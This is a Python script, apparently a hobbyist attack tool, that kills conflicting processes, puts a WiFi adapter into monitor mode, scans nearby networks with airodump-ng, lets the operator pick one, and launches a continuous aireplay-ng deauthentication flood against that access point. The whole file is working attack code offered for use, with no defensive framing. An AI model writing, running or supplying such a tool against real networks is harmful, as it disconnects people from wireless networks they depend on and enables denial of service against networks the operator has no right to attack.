import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

wireless_networks = []

def check_for_essid(essid, lst):
	check_status = True

	if len(lst) == 0:
		return check_status

	for item in lst:
		if essid in item["ESSID"]:
			check_status = False

	return check_status

print("\033[93m-------We ArE ReApEr------")


if not 'SUDO_UID' in os.environ.keys():
	print("RUN WITH SUDO")
	exit()
	
for file_name in os.listdir():
    if ".csv" in file_name:

        directory = os.getcwd()
        try:
            os.mkdir(directory + "/ddata/")
        except:
            print("Folder already exists")

        timestamp = datetime.now()

        shutil.move(file_name, directory + "/ddata/" + str(timestamp) + "-" + file_name)


wlan_pattern = re.compile("^wlo[0-9]+")
check_wifi = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())


if len(check_wifi) == 0:
	print("No WiFi adapter")
	exit()

print("Available WiFi interfaces:")
for index, item in enumerate(check_wifi):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Select the interface you want to use for attack: ")
    try:
        if check_wifi[int(wifi_interface_choice)]:
            break
    except:
        print("Enter a valid number")


hackface = check_wifi[int(wifi_interface_choice)]

print("Killing conflict processes")

kill_conflict = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Going Monitor Mode")

monitor_mode = subprocess.run(["sudo", "airmon-ng", "start", hackface])

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hackface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        print("Listing available WiFi Network")
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], wireless_networks):
                                wireless_networks.append(row)

        print("Press Ctrl+C at any time to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nMake a choice.")

while True:
    choice = input("Select WiFi Network from above: ")
    try:
        if wireless_networks[int(choice)]:
            break
    except:
        print("Please try again")

mac = wireless_networks[int(choice)]["BSSID"]
channel = wireless_networks[int(choice)]["channel"].strip()
		
subprocess.run(["airmon-ng", "start", hackface, channel])

print("Starting attack")
print("Press Ctrl+C at any time to stop the attack")

subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac, check_wifi[int(wifi_interface_choice)]])
